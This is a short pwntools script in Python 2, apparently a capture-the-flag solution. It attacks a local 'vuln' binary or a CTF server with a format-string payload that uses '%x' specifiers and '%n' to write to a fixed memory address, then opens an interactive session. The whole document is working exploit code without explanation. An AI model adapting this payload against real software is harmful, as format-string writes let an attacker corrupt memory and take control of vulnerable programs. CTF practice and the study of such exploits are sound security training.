from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10204)

target = 0x804A06C

payload = p32(target)
payload += ' %x %x %x %x %x %n'

p.sendlineafter('Bug', payload)

print p.recv(1000)

p.interactive()
